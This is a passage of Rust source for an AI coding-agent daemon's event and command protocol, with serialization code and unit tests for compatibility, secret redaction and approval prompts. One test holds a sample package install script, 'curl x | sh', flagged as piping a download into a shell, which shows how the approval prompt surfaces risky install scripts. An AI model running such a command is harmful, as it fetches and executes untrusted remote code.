    SessionCompacted(SessionCompacted),
    RunStarted(RunStarted),
    AgentStarted(AgentStarted),
    TurnStarted(TurnStarted),
    MessageStarted(MessageEvent),
    MessageUpdated(MessageEvent),
    MessageCompleted(MessageEvent),
    ToolStarted(ToolEvent),
    ToolUpdated(ToolEvent),
    ToolCompleted(ToolEvent),
    Warning(WarningEvent),
    RouterDiagnostic(RouterDiagnostic),
    Retry(RetryEvent),
    ContextCompacted(ContextCompacted),
    ResourceLimit(ResourceLimit),
    SteeringInjected(SteeringInjected),
    RunCompleted(RunCompleted),
    CommandAck(CommandAck),
    Error(ErrorEvent),
    // --- Daemon additions (spec daemon-core §6).
    SessionListed(SessionListed),
    SessionAttached(SessionEvent),
    SessionDetached(SessionEvent),
    WorkListed(WorkListed),
    WorkActioned(WorkActioned),
    WorkChanged(WorkChanged),
    ApprovalRequested(ApprovalRequested),
    QuestionAsked(QuestionAsked),
    RequestResolved(RequestResolved),
    RunDrained(RunDrained),
    SessionOwnershipReported(SessionOwnershipReported),
    /// Sent only to connections that negotiated `agent_events`.
    AgentEvent(AgentEventWire),
    Unknown {
        event_type: String,
        fields: Map<String, Value>,
    },
}

impl Event {
    pub fn event_type(&self) -> &str {
        match self {
            Self::RuntimeReady(_) => "runtime_ready",
            Self::SessionCreated(_) => "session_created",
            Self::SessionResumed(_) => "session_resumed",
            Self::SessionClosed(_) => "session_closed",
            Self::SessionConfigured(_) => "session_configured",
            Self::SessionCompacted(_) => "session_compacted",
            Self::RunStarted(_) => "run_started",
            Self::AgentStarted(_) => "agent_started",
            Self::TurnStarted(_) => "turn_started",
            Self::MessageStarted(_) => "message_started",
            Self::MessageUpdated(_) => "message_updated",
            Self::MessageCompleted(_) => "message_completed",
            Self::ToolStarted(_) => "tool_started",
            Self::ToolUpdated(_) => "tool_updated",
            Self::ToolCompleted(_) => "tool_completed",
            Self::Warning(_) => "warning",
            Self::RouterDiagnostic(_) => "router_diagnostic",
            Self::Retry(_) => "retry",
            Self::ContextCompacted(_) => "context_compacted",
            Self::ResourceLimit(_) => "resource_limit",
            Self::SteeringInjected(_) => "steering_injected",
            Self::RunCompleted(_) => "run_completed",
            Self::CommandAck(_) => "command_ack",
            Self::Error(_) => "error",
            Self::SessionListed(_) => "session_listed",
            Self::SessionAttached(_) => "session_attached",
            Self::SessionDetached(_) => "session_detached",
            Self::WorkListed(_) => "work_listed",
            Self::WorkActioned(_) => "work_actioned",
            Self::WorkChanged(_) => "work_changed",
            Self::ApprovalRequested(_) => "approval_requested",
            Self::QuestionAsked(_) => "question_asked",
            Self::RequestResolved(_) => "request_resolved",
            Self::RunDrained(_) => "run_drained",
            Self::SessionOwnershipReported(_) => "session_ownership_reported",
            Self::AgentEvent(_) => "agent_event",
            Self::Unknown { event_type, .. } => event_type,
        }
    }
}

fn serialize_event<S, T>(event_type: &str, payload: &T, serializer: S) -> Result<S::Ok, S::Error>
where
    S: Serializer,
    T: Serialize,
{
    let mut fields = match serde_json::to_value(payload).map_err(serde::ser::Error::custom)? {
        Value::Object(fields) => fields,
        _ => return Err(serde::ser::Error::custom("event payload was not an object")),
    };
    fields.insert("type".to_owned(), Value::String(event_type.to_owned()));
    fields.serialize(serializer)
}

impl Serialize for Event {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        match self {
            Self::RuntimeReady(v) => serialize_event("runtime_ready", v, serializer),
            Self::SessionCreated(v) => serialize_event("session_created", v, serializer),
            Self::SessionResumed(v) => serialize_event("session_resumed", v, serializer),
            Self::SessionClosed(v) => serialize_event("session_closed", v, serializer),
            Self::SessionConfigured(v) => serialize_event("session_configured", v, serializer),
            Self::SessionCompacted(v) => serialize_event("session_compacted", v, serializer),
            Self::RunStarted(v) => serialize_event("run_started", v, serializer),
            Self::AgentStarted(v) => serialize_event("agent_started", v, serializer),
            Self::TurnStarted(v) => serialize_event("turn_started", v, serializer),
            Self::MessageStarted(v) => serialize_event("message_started", v, serializer),
            Self::MessageUpdated(v) => serialize_event("message_updated", v, serializer),
            Self::MessageCompleted(v) => serialize_event("message_completed", v, serializer),
            Self::ToolStarted(v) => serialize_event("tool_started", v, serializer),
            Self::ToolUpdated(v) => serialize_event("tool_updated", v, serializer),
            Self::ToolCompleted(v) => serialize_event("tool_completed", v, serializer),
            Self::Warning(v) => serialize_event("warning", v, serializer),
            Self::RouterDiagnostic(v) => serialize_event("router_diagnostic", v, serializer),
            Self::Retry(v) => serialize_event("retry", v, serializer),
            Self::ContextCompacted(v) => serialize_event("context_compacted", v, serializer),
            Self::ResourceLimit(v) => serialize_event("resource_limit", v, serializer),
            Self::SteeringInjected(v) => serialize_event("steering_injected", v, serializer),
            Self::RunCompleted(v) => serialize_event("run_completed", v, serializer),
            Self::CommandAck(v) => serialize_event("command_ack", v, serializer),
            Self::Error(v) => serialize_event("error", v, serializer),
            Self::SessionListed(v) => serialize_event("session_listed", v, serializer),
            Self::SessionAttached(v) => serialize_event("session_attached", v, serializer),
            Self::SessionDetached(v) => serialize_event("session_detached", v, serializer),
            Self::WorkListed(v) => serialize_event("work_listed", v, serializer),
            Self::WorkActioned(v) => serialize_event("work_actioned", v, serializer),
            Self::WorkChanged(v) => serialize_event("work_changed", v, serializer),
            Self::ApprovalRequested(v) => serialize_event("approval_requested", v, serializer),
            Self::QuestionAsked(v) => serialize_event("question_asked", v, serializer),
            Self::RequestResolved(v) => serialize_event("request_resolved", v, serializer),
            Self::RunDrained(v) => serialize_event("run_drained", v, serializer),
            Self::SessionOwnershipReported(v) => {
                serialize_event("session_ownership_reported", v, serializer)
            }
            Self::AgentEvent(v) => serialize_event("agent_event", v, serializer),
            Self::Unknown { event_type, fields } => {
                let mut fields = fields.clone();
                fields.insert("type".to_owned(), Value::String(event_type.clone()));
                fields.serialize(serializer)
            }
        }
    }
}

impl<'de> Deserialize<'de> for Event {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        let mut fields = Map::<String, Value>::deserialize(deserializer)?;
        let event_type = fields
            .remove("type")
            .and_then(|value| value.as_str().map(ToOwned::to_owned))
            .ok_or_else(|| D::Error::custom("event.type must be a string"))?;
        let payload = Value::Object(fields.clone());

        macro_rules! decode {
            ($variant:ident, $ty:ty) => {
                serde_json::from_value::<$ty>(payload)
                    .map(Self::$variant)
                    .map_err(D::Error::custom)
            };
        }

        match event_type.as_str() {
            "runtime_ready" => decode!(RuntimeReady, RuntimeReady),
            "session_created" => decode!(SessionCreated, SessionEvent),
            "session_resumed" => decode!(SessionResumed, SessionEvent),
            "session_closed" => decode!(SessionClosed, SessionEvent),
            "session_configured" => decode!(SessionConfigured, SessionConfigured),
            "session_compacted" => decode!(SessionCompacted, SessionCompacted),
            "run_started" => decode!(RunStarted, RunStarted),
            "agent_started" => decode!(AgentStarted, AgentStarted),
            "turn_started" => decode!(TurnStarted, TurnStarted),
            "message_started" => decode!(MessageStarted, MessageEvent),
            "message_updated" => decode!(MessageUpdated, MessageEvent),
            "message_completed" => decode!(MessageCompleted, MessageEvent),
            "tool_started" => decode!(ToolStarted, ToolEvent),
            "tool_updated" => decode!(ToolUpdated, ToolEvent),
            "tool_completed" => decode!(ToolCompleted, ToolEvent),
            "warning" => decode!(Warning, WarningEvent),
            "router_diagnostic" => decode!(RouterDiagnostic, RouterDiagnostic),
            "retry" => decode!(Retry, RetryEvent),
            "context_compacted" => decode!(ContextCompacted, ContextCompacted),
            "resource_limit" => decode!(ResourceLimit, ResourceLimit),
            "steering_injected" => decode!(SteeringInjected, SteeringInjected),
            "run_completed" => decode!(RunCompleted, RunCompleted),
            "command_ack" => decode!(CommandAck, CommandAck),
            "error" => decode!(Error, ErrorEvent),
            "session_listed" => decode!(SessionListed, SessionListed),
            "session_attached" => decode!(SessionAttached, SessionEvent),
            "session_detached" => decode!(SessionDetached, SessionEvent),
            "work_listed" => decode!(WorkListed, WorkListed),
            "work_actioned" => decode!(WorkActioned, WorkActioned),
            "work_changed" => decode!(WorkChanged, WorkChanged),
            "approval_requested" => decode!(ApprovalRequested, ApprovalRequested),
            "question_asked" => decode!(QuestionAsked, QuestionAsked),
            "request_resolved" => decode!(RequestResolved, RequestResolved),
            "run_drained" => decode!(RunDrained, RunDrained),
            "session_ownership_reported" => {
                decode!(SessionOwnershipReported, SessionOwnershipReported)
            }
            "agent_event" => decode!(AgentEvent, AgentEventWire),
            _ => Ok(Self::Unknown { event_type, fields }),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn command_uses_v1_shape() {
        let request = RequestEnvelope::new(
            "req-1",
            Command::RunStart {
                session_id: "session-1".into(),
                prompt: "hello".into(),
                output_schema: None,
                max_turns: Some(3),
                token_budget: None,
                timeout_secs: None,
                attachments: Vec::new(),
            },
        );
        let value = serde_json::to_value(request).unwrap();
        assert_eq!(value["protocol_version"], 1);
        assert_eq!(value["request_id"], "req-1");
        assert_eq!(value["command"]["type"], "run_start");
        assert_eq!(value["command"]["prompt"], "hello");
        assert!(value["command"].get("output_schema").is_none());
    }

    #[test]
    fn interactive_session_additions_round_trip_and_legacy_payloads() {
        let configure = RequestEnvelope::new(
            "req-configure",
            Command::SessionConfigure {
                session_id: "session-1".into(),
                model: Some("anthropic/claude".into()),
                reasoning: Some(Reasoning::High),
                permission_mode: Some("ask".into()),
                title: Some("Fix login".into()),
            },
        );
        let configure_json = serde_json::to_value(&configure).unwrap();
        assert_eq!(configure_json["command"]["type"], "session_configure");
        assert_eq!(
            serde_json::from_value::<RequestEnvelope>(configure_json).unwrap(),
            configure
        );

        let compact = RequestEnvelope::new(
            "req-compact",
            Command::SessionCompact {
                session_id: "session-1".into(),
            },
        );
        let compact_json = serde_json::to_value(&compact).unwrap();
        assert_eq!(compact_json["command"]["type"], "session_compact");
        assert_eq!(
            serde_json::from_value::<RequestEnvelope>(compact_json).unwrap(),
            compact
        );

        let attach = RequestEnvelope::new(
            "req-attach",
            Command::SessionAttach {
                session_id: "session-1".into(),
                since_sequence: Some(17),
                daemon_epoch: Some("epoch-1".into()),
            },
        );
        assert_eq!(
            serde_json::from_value::<RequestEnvelope>(serde_json::to_value(&attach).unwrap())
                .unwrap(),
            attach
        );

        let run = RequestEnvelope::new(
            "req-run",
            Command::RunStart {
                session_id: "session-1".into(),
                prompt: "look at this".into(),
                output_schema: None,
                max_turns: None,
                token_budget: None,
                timeout_secs: None,
                attachments: vec![Attachment::Image(ImageAttachment {
                    data: "aGVsbG8=".into(),
                    mime_type: "image/png".into(),
                    width: Some(1),
                    height: Some(1),
                })],
            },
        );
        assert_eq!(
            serde_json::from_value::<RequestEnvelope>(serde_json::to_value(&run).unwrap()).unwrap(),
            run
        );

        for event in [
            Event::SessionConfigured(SessionConfigured {
                session_id: "session-1".into(),
                model: Some("anthropic/claude".into()),
                reasoning: Some(Reasoning::High),
                permission_mode: Some("ask".into()),
                title: Some("Fix login".into()),
            }),
            Event::SessionCompacted(SessionCompacted {
                session_id: "session-1".into(),
                before_tokens: 100,
                after_tokens: 40,
            }),
        ] {
            assert_eq!(
                serde_json::from_value::<Event>(serde_json::to_value(&event).unwrap()).unwrap(),
                event
            );
        }

        let old_attach: RequestEnvelope = serde_json::from_value(serde_json::json!({
            "protocol_version": 1,
            "request_id": "old-attach",
            "command": {"type": "session_attach", "session_id": "session-1"}
        }))
        .unwrap();
        assert_eq!(
            old_attach.command,
            Command::SessionAttach {
                session_id: "session-1".into(),
                since_sequence: None,
                daemon_epoch: None,
            }
        );

        let old_run: RequestEnvelope = serde_json::from_value(serde_json::json!({
            "protocol_version": 1,
            "request_id": "old-run",
            "command": {
                "type": "run_start",
                "session_id": "session-1",
                "prompt": "hello"
            }
        }))
        .unwrap();
        assert!(
            matches!(old_run.command, Command::RunStart { attachments, .. } if attachments.is_empty())
        );

        let old_summary: SessionSummary = serde_json::from_value(serde_json::json!({
            "session_id": "session-1",
            "cwd": "/tmp/project",
            "created_at": "2026-10-24T00:00:00Z",
            "last_activity_at": "2026-10-24T00:00:00Z",
            "owner": "local"
        }))
        .unwrap();
        assert_eq!(old_summary.reasoning, None);
        assert_eq!(old_summary.permission_mode, None);
        assert_eq!(old_summary.messages_len, None);

        assert_eq!(capabilities::SESSION_CONFIGURE, "session_configure");
        assert_eq!(capabilities::SESSION_COMPACT, "session_compact");
        assert_eq!(capabilities::ATTACH_REPLAY, "attach_replay");
        assert_eq!(capabilities::RUN_ATTACHMENTS, "run_attachments");

        for (level, wire) in [
            (Reasoning::Minimal, "minimal"),
            (Reasoning::Low, "low"),
            (Reasoning::Medium, "medium"),
            (Reasoning::High, "high"),
            (Reasoning::Xhigh, "xhigh"),
            (Reasoning::Max, "max"),
        ] {
            assert_eq!(serde_json::to_value(level).unwrap(), wire);
            assert_eq!(
                serde_json::from_value::<Reasoning>(wire.into()).unwrap(),
                level
            );
        }
    }

    /// The terminal client receives the agent loop's own events verbatim, as
    /// an opaque object, only after opting in with `agent_events`.
    #[test]
    fn agent_event_frames_round_trip_and_stay_opaque() {
        let event = Event::AgentEvent(AgentEventWire {
            event: serde_json::json!({
                "type": "message_update",
                "message": {"role": "assistant", "content": []},
                "assistant_message_event": {"type": "text_delta", "delta": "hi"}
            }),
        });
        let json = serde_json::to_value(&event).unwrap();
        assert_eq!(json["type"], "agent_event");
        assert_eq!(json["event"]["assistant_message_event"]["delta"], "hi");
        assert_eq!(serde_json::from_value::<Event>(json).unwrap(), event);
        assert_eq!(event.event_type(), "agent_event");
        assert_eq!(capabilities::AGENT_EVENTS, "agent_events");
    }

    #[test]
    fn event_round_trip_and_unknown_event_are_forward_compatible() {
        let known = Event::RunCompleted(RunCompleted {
            status: RunStatus::Completed,
            output: "done".into(),
            structured_output: Some(serde_json::json!({"answer": 42})),
            messages: vec![],
            usage: Usage::default(),
            turns: 1,
            tool_calls: 0,
        });
        let value = serde_json::to_value(&known).unwrap();
        assert_eq!(value["type"], "run_completed");
        assert_eq!(serde_json::from_value::<Event>(value).unwrap(), known);

        // Additive fields on known v1 events are ignored for compatibility.
        let ready: Event = serde_json::from_value(serde_json::json!({
            "type": "runtime_ready",
            "runtime_version": "1.0.0",
            "supported_protocol_versions": [1],
            "capabilities": [],
            "future_additive_field": {"enabled": true}
        }))
        .unwrap();
        assert!(matches!(ready, Event::RuntimeReady(_)));

        let unknown: Event = serde_json::from_value(serde_json::json!({
            "type": "future_event",
            "new_field": true
        }))
        .unwrap();
        assert!(matches!(
            unknown,
            Event::Unknown { ref event_type, ref fields }
                if event_type == "future_event" && fields["new_field"] == true
        ));
    }

    /// Every daemon command (spec daemon-core R2.3) serializes under the v1
    /// tagged shape and round-trips through the shared enum.
    #[test]
    fn daemon_commands_round_trip() {
        let commands = vec![
            Command::SessionList,
            Command::SessionAttach {
                session_id: "s1".into(),
                since_sequence: None,
                daemon_epoch: None,
            },
            Command::SessionDetach {
                session_id: "s1".into(),
            },
            Command::WorkList,
            Command::WorkAction {
                work_id: "task:1".into(),
                action: WorkActionKind::Message {
                    text: "carry on".into(),
                },
            },
            Command::WorkAction {
                work_id: "agent-1".into(),
                action: WorkActionKind::Rename {
                    name: "reviewer".into(),
                },
            },
            Command::ApprovalRespond {
                request_id: "req-1".into(),
                decision: ApprovalDecision::Approve,
            },
            Command::QuestionAnswer {
                request_id: "req-2".into(),
                answer: "yes".into(),
                dismissed: false,
            },
            Command::RunDrain {
                session_id: "s1".into(),
                now: true,
            },
            Command::SessionOwnership {
                session_id: "s1".into(),
                owner: OwnerWire::Platform,
                owner_generation: 3,
            },
        ];
        for command in commands {
            let request = RequestEnvelope::new("r", command.clone());
            let json = serde_json::to_value(&request).unwrap();
            assert!(json["command"]["type"].is_string(), "{json}");
            let back: RequestEnvelope = serde_json::from_value(json).unwrap();
            assert_eq!(back.command, command);
        }

        let stop = serde_json::to_value(Command::WorkAction {
            work_id: "w".into(),
            action: WorkActionKind::Stop,
        })
        .unwrap();
        assert_eq!(stop["type"], "work_action");
        assert_eq!(stop["action"]["kind"], "stop");
    }

    /// Every daemon event round-trips through the typed enum, and durations
    /// travel as elapsed milliseconds (R4.2), never as instants.
    #[test]
    fn daemon_events_round_trip() {
        let item = WorkItemWire {
            id: "task:7".into(),
            name: "cargo test".into(),
            kind: "bash_task".into(),
            status: "running".into(),
            owner: WorkOwnerWire::Session {
                session_id: "s1".into(),
            },
            parent: Some("main:s1".into()),
            elapsed_ms: 4_200,
            tokens_in: 12,
            tokens_out: 30,
            tool_calls: 3,
            current_action: Some("cargo test --workspace".into()),
            pending: Some(PendingWire {
                request_id: "req-9".into(),
                kind: "approval".into(),
                summary: Some("run cargo clippy".into()),
            }),
            detail: None,
            stalled_secs: None,
        };
        let events = vec![
            Event::SessionListed(SessionListed {
                sessions: vec![SessionSummary {
                    session_id: "s1".into(),
                    session_uuid: Some("8f0e7f5d-2a1a-4b3b-9d3a-0d2f6a1e2c33".into()),
                    cwd: "/tmp/p".into(),
                    model: Some("anthropic/claude".into()),
                    title: Some("fix login".into()),
                    created_at: "2026-09-09T00:00:00Z".into(),
                    last_activity_at: "2026-09-09T00:01:00Z".into(),
                    active_run: Some("run-1".into()),
                    attached_clients: 2,
                    owner: OwnerWire::Local,
                    owner_generation: 0,
                    reasoning: None,
                    permission_mode: Some("ask".into()),
                    messages_len: None,
                }],
            }),
            Event::SessionAttached(SessionEvent::default()),
            Event::SessionDetached(SessionEvent::default()),
            Event::WorkListed(WorkListed {
                revision: 41,
                counts: WorkCountsWire {
                    needs_input: 1,
                    active: 2,
                    finished: 0,
                },
                items: vec![item],
                truncated: false,
            }),
            Event::WorkActioned(WorkActioned {
                work_id: "task:7".into(),
            }),
            Event::WorkChanged(WorkChanged { revision: 42 }),
            Event::ApprovalRequested(ApprovalRequested {
                request_id: "req-9".into(),
                work_id: Some("agent-1".into()),
                tool: "bash".into(),
                summary: "run cargo clippy".into(),
                risk: Some("high".into()),
                always_allow_available: false,
                rule_pattern: None,
                ..Default::default()
            }),
            Event::QuestionAsked(QuestionAsked {
                request_id: "req-10".into(),
                work_id: None,
                question: "Which branch?".into(),
                options: vec!["main".into(), "dev".into()],
                recommended: None,
            }),
            Event::RequestResolved(RequestResolved {
                request_id: "req-10".into(),
                outcome: RequestOutcome::Withdrawn,
                answer: None,
            }),
            Event::RunDrained(RunDrained {
                journal_sequence: 17,
                journal_hash: "abc".into(),
            }),
            Event::SessionOwnershipReported(SessionOwnershipReported {
                owner: OwnerWire::Platform,
                owner_generation: 3,
            }),
        ];
        for event in events {
            let json = serde_json::to_value(&event).unwrap();
            let tag = json["type"].as_str().unwrap().to_owned();
            let back: Event = serde_json::from_value(json).unwrap();
            assert_eq!(back, event, "{tag}");
            assert!(
                !matches!(back, Event::Unknown { .. }),
                "{tag} must decode to a typed variant"
            );
        }
    }

    /// A peer built before these additions must see every new event as
    /// `Unknown` and keep going, and must be able to send the old commands
    /// unchanged (R2.3 additivity).
    #[test]
    fn v1_client_ignores_unknown_daemon_events() {
        for tag in [
            "session_listed",
            "session_attached",
            "session_detached",
            "work_listed",
            "work_actioned",
            "work_changed",
            "approval_requested",
            "question_asked",
            "request_resolved",
            "run_drained",
            "session_ownership_reported",
        ] {
            // Emulate the pre-daemon decoder: only the original tags are known.
            let is_v1_tag = matches!(
                tag,
                "runtime_ready"
                    | "session_created"
                    | "session_resumed"
                    | "session_closed"
                    | "run_started"
                    | "turn_started"
                    | "message"
                    | "tool"
                    | "warning"
                    | "router_diagnostic"
                    | "retry"
                    | "context_compacted"
                    | "resource_limit"
                    | "steering_injected"
                    | "run_completed"
                    | "command_ack"
                    | "error"
            );
            assert!(!is_v1_tag, "{tag} must be a new tag");
        }

        let ready: RuntimeReady = serde_json::from_value(serde_json::json!({
            "runtime_version": "0.1.0",
            "supported_protocol_versions": [1],
            "capabilities": ["session_list", "work_registry"],
            "daemon": {"enabled": true}
        }))
        .unwrap();
        assert_eq!(ready.daemon, Some(DaemonInfo { enabled: true }));

        let legacy: RuntimeReady = serde_json::from_value(serde_json::json!({
            "runtime_version": "0.1.0",
            "supported_protocol_versions": [1]
        }))
        .unwrap();
        assert_eq!(legacy.daemon, None);
    }

    #[test]
    fn mcp_debug_redacts_secret_values() {
        let mcp = McpServerConfig::Sse {
            name: "server".into(),
            url: "https://token@example.invalid/?key=secret".into(),
            headers: BTreeMap::from([("Authorization".into(), "Bearer secret".into())]),
            tool_timeout_sec: None,
        };
        let debug = format!("{mcp:?}");
        assert!(!debug.contains("Bearer secret"));
        assert!(!debug.contains("token@example"));
        assert!(debug.contains("Authorization"));

        let value = serde_json::to_value(mcp).unwrap();
        assert_eq!(value["transport"], "sse");
        assert_eq!(value["headers"]["Authorization"], "Bearer secret");
    }

    #[test]
    fn mcp_streamable_http_round_trips_and_redacts() {
        let mcp = McpServerConfig::StreamableHttp {
            name: "server".into(),
            url: "https://token@example.invalid/mcp".into(),
            headers: BTreeMap::from([("X-Static".into(), "static-secret".into())]),
            bearer_token_env_var: Some("MCP_TOKEN".into()),
            env_http_headers: BTreeMap::from([("X-Org".into(), "MCP_ORG".into())]),
            tool_timeout_sec: None,
        };

        // Debug never shows the URL or header values; env var *names* are
        // safe to print because they carry no secret material.
        let debug = format!("{mcp:?}");
        assert!(!debug.contains("static-secret"));
        assert!(!debug.contains("token@example"));
        assert!(debug.contains("MCP_TOKEN"));
        assert!(debug.contains("X-Static"));

        let value = serde_json::to_value(&mcp).unwrap();
        assert_eq!(value["transport"], "streamable_http");
        assert_eq!(value["bearer_token_env_var"], "MCP_TOKEN");
        assert_eq!(value["env_http_headers"]["X-Org"], "MCP_ORG");
        let back: McpServerConfig = serde_json::from_value(value).unwrap();
        assert_eq!(back, mcp);

        // Optional auth fields are omitted on the wire when unset, so older
        // consumers see the same shape as before.
        let bare = serde_json::to_value(McpServerConfig::StreamableHttp {
            name: "bare".into(),
            url: "https://example.invalid/mcp".into(),
            headers: BTreeMap::new(),
            bearer_token_env_var: None,
            env_http_headers: BTreeMap::new(),
            tool_timeout_sec: None,
        })
        .unwrap();
        assert!(bare.get("bearer_token_env_var").is_none());
        assert!(bare.get("env_http_headers").is_none());
        assert!(bare.get("tool_timeout_sec").is_none());
    }

    /// A server's tool time limit is carried when set, and a config from
    /// before the field still reads, with no limit of its own.
    #[test]
    fn mcp_tool_timeout_is_additive() {
        let legacy: McpServerConfig = serde_json::from_value(serde_json::json!({
            "transport": "stdio", "name": "srv", "command": "server"
        }))
        .unwrap();
        let McpServerConfig::Stdio {
            tool_timeout_sec, ..
        } = &legacy
        else {
            panic!("stdio expected");
        };
        assert_eq!(*tool_timeout_sec, None);
        let wire = serde_json::to_value(&legacy).unwrap();
        assert!(wire.get("tool_timeout_sec").is_none());

        let set: McpServerConfig = serde_json::from_value(serde_json::json!({
            "transport": "stdio", "name": "srv", "command": "server", "tool_timeout_sec": 300
        }))
        .unwrap();
        assert_eq!(serde_json::to_value(&set).unwrap()["tool_timeout_sec"], 300);
        assert!(format!("{set:?}").contains("300"));
    }

    /// R1.14/R1.15 on the wire: a question carries the option the agent
    /// recommends; a session opts into questions the way it opts into
    /// approvals; and a client says the user is busy answering, which
    /// restarts a question's 5 minutes. All additive: payloads from before
    /// these fields decode unchanged, and an unset field stays off the wire.
    #[test]
    fn question_additions_round_trip_and_stay_additive() {
        let asked = Event::QuestionAsked(QuestionAsked {
            request_id: "q-1".into(),
            work_id: Some("main:s1".into()),
            question: "Which database?".into(),
            options: vec!["SQLite".into(), "Postgres".into()],
            recommended: Some(1),
        });
        let value = serde_json::to_value(&asked).unwrap();
        assert_eq!(value["recommended"], 1);
        assert_eq!(serde_json::from_value::<Event>(value).unwrap(), asked);

        let legacy: Event = serde_json::from_value(serde_json::json!({
            "type": "question_asked",
            "request_id": "q-2",
            "question": "Ship it?",
            "options": ["Yes", "No"]
        }))
        .unwrap();
        let Event::QuestionAsked(legacy) = legacy else {
            panic!("question_asked decodes to the typed variant");
        };
        assert_eq!(legacy.recommended, None);
        let bare = serde_json::to_value(Event::QuestionAsked(legacy)).unwrap();
        assert!(bare.get("recommended").is_none(), "{bare}");

        let policy: ExecutionPolicy = serde_json::from_value(serde_json::json!({
            "sandbox_mode": "workspace_write",
            "interactive_questions": true
        }))
        .unwrap();
        assert!(policy.interactive_questions);
        assert!(!ExecutionPolicy::default().interactive_questions);
        let off = serde_json::to_value(ExecutionPolicy::default()).unwrap();
        assert!(off.get("interactive_questions").is_none(), "{off}");

        let activity = Command::QuestionActivity {
            request_id: "q-1".into(),
        };
        let json = serde_json::to_value(RequestEnvelope::new("r", activity.clone())).unwrap();
        assert_eq!(json["command"]["type"], "question_activity");
        let back: RequestEnvelope = serde_json::from_value(json).unwrap();
        assert_eq!(back.command, activity);

        assert_eq!(capabilities::INTERACTIVE_QUESTIONS, "interactive_questions");
    }

    /// An approval names the rule a window may save for "always allow" or
    /// "always deny", in the window's own rule syntax. Additive: an approval
    /// without it decodes unchanged, and an unset rule stays off the wire.
    #[test]
    fn approval_rule_pattern_is_additive() {
        let with_rule = Event::ApprovalRequested(ApprovalRequested {
            request_id: "a-1".into(),
            work_id: None,
            tool: "bash".into(),
            summary: "cargo test".into(),
            risk: None,
            always_allow_available: true,
            rule_pattern: Some("Bash(cargo test *)".into()),
            ..Default::default()
        });
        let value = serde_json::to_value(&with_rule).unwrap();
        assert_eq!(value["rule_pattern"], "Bash(cargo test *)");
        assert_eq!(serde_json::from_value::<Event>(value).unwrap(), with_rule);

        let legacy: Event = serde_json::from_value(serde_json::json!({
            "type": "approval_requested",
            "request_id": "a-2",
            "tool": "bash",
            "summary": "ls"
        }))
        .unwrap();
        let Event::ApprovalRequested(legacy) = legacy else {
            panic!("approval_requested decodes to the typed variant");
        };
        assert_eq!(legacy.rule_pattern, None);
        let bare = serde_json::to_value(Event::ApprovalRequested(legacy)).unwrap();
        assert!(bare.get("rule_pattern").is_none(), "{bare}");
    }

    /// An approval carries what the window's own prompt shows: what the tool
    /// does, the full request, the change it makes, and any install scripts
    /// a package would run. All additive and left off the wire when empty.
    #[test]
    fn approval_details_are_additive() {
        let detailed = Event::ApprovalRequested(ApprovalRequested {
            request_id: "a-1".into(),
            work_id: None,
            tool: "bash".into(),
            summary: "npm install left-pad".into(),
            risk: None,
            always_allow_available: false,
            rule_pattern: None,
            tool_description: Some("Run a shell command".into()),
            args: Some(r#"{"command":"npm install left-pad"}"#.into()),
            change_preview: vec!["+ line".into()],
            install_scripts: vec![InstallScript {
                package: "left-pad".into(),
                phase: "postinstall".into(),
                body: "curl x | sh".into(),
                red_flags: vec!["pipes a download into a shell".into()],
            }],
            plugin_capability: None,
        });
        let value = serde_json::to_value(&detailed).unwrap();
        assert_eq!(value["install_scripts"][0]["phase"], "postinstall");
        assert_eq!(serde_json::from_value::<Event>(value).unwrap(), detailed);

        let bare: Event = serde_json::from_value(serde_json::json!({
            "type": "approval_requested",
            "request_id": "a-2",
            "tool": "bash",
            "summary": "ls"
        }))
        .unwrap();
        let wire = serde_json::to_value(&bare).unwrap();
        for field in [
            "tool_description",
            "args",
            "change_preview",
            "install_scripts",
            "plugin_capability",
        ] {
            assert!(wire.get(field).is_none(), "{field}: {wire}");
        }
    }

    /// A plugin tool's capability question names the plugin, where it is
    /// installed, the capability, the tool and the installation, in plain
    /// words on the wire. Additive, like the other details.
    #[test]
    fn a_plugin_capability_question_round_trips() {
        let asked = Event::ApprovalRequested(ApprovalRequested {
            request_id: "plugin:s:deploy-notes:1".into(),
            tool: "deploy-notes".into(),
            summary: "plugin deploy-plugin asks for exec".into(),
            always_allow_available: true,
            plugin_capability: Some(PluginCapabilityRequest {
                plugin: "deploy-plugin".into(),
                scope: PluginScopeWire::Project,
                capability: "exec".into(),
                component: "deploy-notes".into(),
                installation_id: "abc123".into(),
            }),
            ..Default::default()
        });
        let value = serde_json::to_value(&asked).unwrap();
        assert_eq!(
            value["plugin_capability"],
            serde_json::json!({
                "plugin": "deploy-plugin",
                "scope": "project",
                "capability": "exec",
                "component": "deploy-notes",
                "installation_id": "abc123",
            })
        );
        assert_eq!(serde_json::from_value::<Event>(value).unwrap(), asked);
    }

    /// A question can be dismissed, which the agent hears as a dismissal,
    /// not as an answer someone typed. Additive: an answer from before the
    /// field is an ordinary answer.
    #[test]
    fn a_question_can_be_dismissed() {
        let dismissed = Command::QuestionAnswer {
            request_id: "q-1".into(),
            answer: String::new(),
            dismissed: true,
        };
        let json = serde_json::to_value(RequestEnvelope::new("r", dismissed.clone())).unwrap();
        assert_eq!(json["command"]["dismissed"], true);
        let back: RequestEnvelope = serde_json::from_value(json).unwrap();
        assert_eq!(back.command, dismissed);

        let legacy: RequestEnvelope = serde_json::from_value(serde_json::json!({
            "protocol_version": 1,
            "request_id": "r",
            "command": {"type": "question_answer", "request_id": "q-1", "answer": "SQLite"}
        }))
        .unwrap();
        let Command::QuestionAnswer { dismissed, .. } = &legacy.command else {
            panic!("question_answer decodes");
        };
        assert!(!dismissed);
        let wire = serde_json::to_value(&legacy).unwrap();
        assert!(wire["command"].get("dismissed").is_none(), "{wire}");
    }

    /// A session asks for the instructions a window gives its model
    /// (`full`) or keeps the short ones the service has always given (`bare`,
    /// the default, so an SDK caller that never sets it is unchanged).
    /// Additive: a create from before the field decodes as bare, and an
    /// unset profile stays off the wire.
    #[test]
    fn session_create_instructions_are_additive_and_default_to_bare() {
        let full = Command::SessionCreate {
            session_id: Some("s1".into()),
            model: "anthropic:claude".into(),
            cwd: "/tmp/p".into(),
            system_prompt: None,
            reasoning: None,
            execution_policy: None,
            mcp_servers: Vec::new(),
            context: None,
            permission_mode: None,
            instructions: Some(SessionInstructions::Full),
        };
        let json = serde_json::to_value(RequestEnvelope::new("r", full.clone())).unwrap();
